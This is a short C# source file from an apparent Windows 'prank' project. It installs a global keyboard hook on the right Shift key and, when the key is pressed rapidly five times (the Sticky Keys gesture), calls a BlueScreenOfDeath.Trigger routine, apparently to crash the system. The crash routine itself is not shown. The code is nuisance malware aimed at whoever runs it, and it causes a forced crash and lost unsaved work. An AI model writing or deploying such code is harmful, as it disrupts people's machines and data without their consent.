using Windows.Win32.UI.Input.KeyboardAndMouse;

namespace WinapiPrank;

/// <summary>
/// when user press [shift] multiple time to enable the sticky keys, bsod will be triggered
/// </summary>
public class StickyKeysBsodPistun
{
    private readonly KeyHook _keyHook = new KeyHook(
        VIRTUAL_KEY.VK_RSHIFT, 
        TimeSpan.FromMilliseconds(200), 
        5, 
        StickyKeysActivated,
        null
    );


    /// <summary>
    /// run blocking
    /// </summary>
    public void Run(CancellationToken token = default)
    {
        if (_keyHook.Setup())
        {
            _keyHook.Run(token);
            _keyHook.Dispose();
        }
    }

    private static void StickyKeysActivated()
    {
        BlueScreenOfDeath.Trigger();
    }
}